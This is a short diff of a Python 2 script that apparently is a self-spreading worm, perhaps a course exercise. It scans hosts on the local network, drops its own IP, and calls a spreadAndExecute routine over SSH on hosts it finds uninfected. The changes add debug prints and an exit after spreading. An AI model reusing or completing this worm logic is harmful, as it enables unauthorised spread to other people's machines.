@@ -231,6 +231,8 @@ if len(sys.argv) < 2:
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
+print(getMyIP())
+print(networkHosts)
 networkHosts.remove(getMyIP())
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
@@ -262,6 +264,7 @@ for host in networkHosts:
 		except IOError:
 			print "This system should be infected"
 			spreadAndExecute(sshInfo[0])
+			sys.exit()
 
 		# TODO: Check if the system was	
 		# already infected. This can be
